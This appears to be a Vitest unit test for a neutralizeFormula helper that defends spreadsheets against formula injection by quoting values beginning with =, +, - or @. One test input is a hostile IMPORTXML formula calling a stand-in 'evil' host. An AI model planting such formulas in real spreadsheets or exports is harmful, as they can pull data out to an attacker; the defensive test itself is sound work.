import { describe, it, expect } from 'vitest';
import { neutralizeFormula } from '../../lib/sheetSafe.js';

describe('neutralizeFormula', () => {
  it('prefixes formula-leading characters', () => {
    expect(neutralizeFormula('=IMPORTXML("http://evil","//a")')).toBe("'=IMPORTXML(\"http://evil\",\"//a\")");
    for (const c of ['+', '-', '@']) expect(neutralizeFormula(`${c}x`)).toBe(`'${c}x`);
  });
  it('leaves normal captions untouched', () => {
    expect(neutralizeFormula('Shot at golden hour')).toBe('Shot at golden hour');
    expect(neutralizeFormula('')).toBe('');
  });
});
